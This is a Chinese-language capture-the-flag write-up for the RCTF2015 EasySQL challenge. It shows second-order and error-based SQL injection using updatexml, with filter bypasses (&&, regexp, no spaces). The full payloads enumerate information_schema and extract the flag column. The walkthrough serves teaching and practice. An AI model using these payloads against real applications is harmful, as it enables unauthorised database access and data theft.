# \[RCTF2015]EasySQL

## \[RCTF2015]EasySQL

## 考点

* 二次注入
* 报错注入
* `&&`绕过`and`
* `regexp`绕过`=`和`like`
* 处理过滤空格

## wp

有登录注册功能，注册页面，试了一下，`username` 和 `email` 处有过滤，输入`aaaa'`和`aaaa\`直接提`示invalid string!`

直接 fuzz 一下哪些字符被禁了

![](../.gitbook/assets/rctf2015\_ezsql\_2.png)

注册成功之后，有一个修改密码的功能，这里的考点应该就是二次注入。二次注入就是它在存入数据库时进行了特殊字符的处理，但是在修改密码这里，从数据库中读取出来时，没有对数据处理

注册用户名 `aaaa"` ，在修改密码时有个报错的回显

![](<../.gitbook/assets/image (15) (2).png>)

可以判断注册的语句如下

```sql
INSERT INTO users(name,pwd,email) VALUES (waf(username),md5(password),waf(email))
```

修改密码的语句如下

```sql
update users set pwd="newpass" where name="username" and pwd="oldpass"
```

可以考虑报错注入

`username=bbbb"||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#`

得到回显`XPATH syntax error: ':article,flag,users'`

试了一下发现flag 不在 flag 表中，`username=bbbb"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))),1))#`，提示`XPATH syntax error: ':name,pwd,email,real_flag_1s_her'`，没有显示全

这时候可以考虑`reverse()`函数，或者使用`&&`绕过`and`，`regexp`绕过`=`和`like`

使用`username=peri0d"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))),1))#`，得到`XPATH syntax error: ':real_flag_1s_here'`

然后读取就可以了

```
username=bbbb"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#
username=bbbb"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f'))),1))#
```
